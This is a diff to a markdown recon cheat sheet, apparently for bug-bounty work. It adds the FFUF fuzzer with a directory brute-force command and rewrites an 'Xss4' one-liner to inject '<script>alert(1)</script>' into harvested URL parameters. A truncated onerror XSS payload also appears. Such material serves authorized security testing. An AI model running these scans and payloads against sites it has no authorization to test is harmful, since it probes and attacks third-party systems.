@@ -31,6 +31,7 @@
 [Nikto](https://github.com/sullo/nikto/tree/master)<br>
 [Tplmap](https://github.com/epinna/tplmap)<br>
 [Parabellum](https://github.com/wtechsec/Parabellum-XSS-Scanner/tree/main)<br>
+[FFUF](https://github.com/ffuf/ffuf)<br>
 
 
 ###  Dorks. 
@@ -163,6 +164,12 @@ gau $(cat url) | grep "\.js" | anew gau
 gospider -d 0 -s $(cat url) -c 5 -t 100 -d 5 --blacklist jpg,jpeg,gif,css,tif,tiff,png,ttf,woff,woff2,ico,pdf,svg,txt | grep -Eo '(http|https)://[^/"]+' | anew gospider
 ```
 
+###  FFUF. 
+
+```bash
+ffuf -w /usr/share/wordlists/wfuzz/general/big.txt -u https://$(cat url)/FUZZ -mc all -c -v | anew ffuf
+```
+
 
 ###  Xss1. 
 
@@ -190,7 +197,7 @@ echo $(cat url) | waybackurls | gf xss | uro | qsreplace '"><img src=x onerror=a
 ###  Xss4. 
 
 ```bash
-gau $(cat url) | httpx-toolkit -silent | qsreplace '>XSS<' | freq | grep '>XSS<' | anew xss4;
+gau $(cat url) | httpx-toolkit -silent | qsreplace '<script>alert(1)</script>' | freq | egrep -v 'Not' | anew xss4;
 ```
 
 
